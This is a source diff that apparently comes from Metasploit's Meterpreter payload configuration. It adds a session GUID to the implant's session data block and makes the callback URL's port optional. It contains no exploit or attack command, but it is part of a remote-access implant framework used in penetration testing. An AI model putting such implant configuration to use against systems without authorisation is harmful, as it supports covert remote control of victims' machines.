@@ -3,6 +3,7 @@ require 'msf/core/payload/uuid'
 require 'msf/core/payload/windows'
 require 'msf/core/reflective_dll_loader'
 require 'rex/socket/x509_certificate'
+require 'securerandom'
 
 class Rex::Payloads::Meterpreter::Config
 
@@ -50,14 +51,23 @@ private
     uuid = opts[:uuid].to_raw
     exit_func = Msf::Payload::Windows.exit_types[opts[:exitfunk]]
 
+    # if no session guid is given then we'll just pass the blank
+    # guid through. this is important for stageless payloads
+    if opts[:stageless] == true || opts[:null_session_guid] == true
+      session_guid = "\x00" * 16
+    else
+      session_guid = [SecureRandom.uuid.gsub(/-/, '')].pack('H*')
+    end
+
     session_data = [
       0,                  # comms socket, patched in by the stager
       exit_func,          # exit function identifer
       opts[:expiration],  # Session expiry
-      uuid                # the UUID
+      uuid,               # the UUID
+      session_guid        # the Session GUID
     ]
 
-    session_data.pack('VVVA*')
+    session_data.pack('QVVA*A*')
   end
 
   def transport_block(opts)
@@ -68,7 +78,8 @@ private
       lhost = "[#{lhost}]"
     end
 
-    url = "#{opts[:scheme]}://#{lhost}:#{opts[:lport]}"
+    url = "#{opts[:scheme]}://#{lhost}"
+    url << ":#{opts[:lport]}" if opts[:lport]
     url << "#{opts[:uri]}/" if opts[:uri]
     url << "?#{opts[:scope_id]}" if opts[:scope_id]
 
